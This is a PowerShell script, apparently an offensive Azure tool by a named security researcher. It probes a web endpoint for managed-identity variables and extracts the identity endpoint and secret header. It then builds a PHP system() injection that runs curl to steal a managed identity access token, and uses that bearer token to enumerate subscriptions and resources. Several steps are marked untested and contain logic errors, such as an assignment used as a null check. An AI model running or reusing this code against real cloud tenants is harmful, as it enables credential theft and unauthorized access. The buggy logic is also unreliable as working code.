Write-Host "_______                    ____________________       ______ _____ __
___    |_________  __________|__  /__    |__  /__________  /___  // /
__  /| |__  /_  / / /_  ___/__/_ <__  /| |_  /___  __ \_  __ \  // /_
_  ___ |_  /_/ /_/ /_  /   ____/ /_  ___ |  / __  /_/ /  / / /__  __/
/_/  |_|____/\__,_/ /_/    /____/ /_/  |_/_/  _  .___//_/ /_/  /_/   
                                              /_/                    
"
Write-Host "Author: Adeeb Shah - [@hyd3sec] | [github.com/hyd3sec]
"
function Connect-AzAccount
{
#needs to be tested
#Takes a username and password and connects to an Azure Account and checks for available resources
param (
    [Parameter(Mandatory=$true)][string]$password,
    [Parameter(Mandatory=$true)][string]$username
)

$passwd = ConvertTo-SecureString $password -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential($username,$passwd)
Connect-AzureAD -Credential $creds
}
function Get-Endpoint
{
    param (
    [Parameter(Mandatory=$true)][string]$envendpoint
)

$Request = (Invoke-WebRequest $envendpoint)
If ($Request.Content -Match "IDENTITY") {
    Write-Host "Endpoint belongs to a managed identity"
}
Else {
    Write-Host "Endpoint does not belong to a managed identity"
}
}

function Get-ManagedIdentityToken 
{
    param (
        [Parameter(Mandatory=$true)][string]$envendpoint
    )
    
    $Request = (Invoke-WebRequest $envendpoint)
    $Response = $Request.Content
    If ($Response -Match "IDENTITY") {
        Write-Host "Endpoint belongs to a managed identity"
        Write-Host "Extracting Endpoint..."
        $regex = '(?<=POINT=)[\w:/.-]+'
        $Identity_Endpoint = (Select-String -inputObject $Response -Pattern $regex | ForEach-Object {$_.Matches.Value})
        Write-Host "Identity Endpoint found: $Identity_Endpoint [Stored in `$Identity_Endpoint]"
        Write-Host "Extracting Header..."
        $regex = '(?<=IDENTITY_HEADER=)[\w:/.-]+'
        $Identity_Header = (Select-String -InputObject $Response -Pattern $regex | ForEach-Object {$_.Matches.Value})
        Write-Host "Identity Header found:"$Identity_Header "[Stored in `$Identity_Header]"
        #Needs to be tested
        $GetMIToken = $envendpoint + "<?php system('curl `"`$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01`" -H secret:`$IDENTITY_HEADER'); ?>"
        Write-Host "Attempting to extract Managed Identity Token..."
        #Need to test this - Uncomment next line and comment line after that once verified it works
        #$IdentityTokenResponse = $GetMIToken.Content
        $IdentityTokenResponse = $Response
        $regex = '(?<=access_token":")[\w-.]+'
        $Identity_Token = (Select-String -InputObject $IdentityTokenResponse -Pattern $regex | ForEach-Object {$_.Matches.Value})
        If ($Identity_Token -match '^eyj') {
            Write-Host "Managed Identity Token: $Identity_Token [Stored in `$Identity_Token]"
        }
        #If $IdentityTokenResponse
        #Add If/Then/Fail
        else {
            Write-Host "Valid Managed Identity Token not found"
        }
    }
    Else {
        Write-Host "Endpoint does not belong to a managed identity"
    }    
}

function Get-ManagedIdentityResources
{
#Run GetManagedIdentityToken and GetSubscriptionID first
$token = $Identity_Token
If ($token = $null) {
    Write-Host "Run GetManagedIdentityToken.ps1 or manually store Managed Identity Token in `$token."
}
$URI = "https://management.azure.com/subscriptions/$subscriptionId/resources?api-version=2020-10-01"
$RequestParams = @{
    Method = 'GET'
    Uri = $URI
    Headers = @{
        'Authorization' = "Bearer $Token"
    }
}
(Invoke-RestMethod @RequestParams).value    
}

function Get-SubscriptionID
{
$token = $Identity_Token
If ($token = $null) {
    Write-Host "Run GetManagedIdentityToken.ps1 or manually store Managed Identity Token in `$token"
}
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
    Method = 'GET'
    Uri = $URI
    Headers = @{
        'Authorization' = "Bearer $token"
    }
}
#Need to test this
$subscriptionID = (Invoke-RestMethod @RequestParams).value.subscriptionId
Write-Host "Subscription ID found: $subscriptionID"
}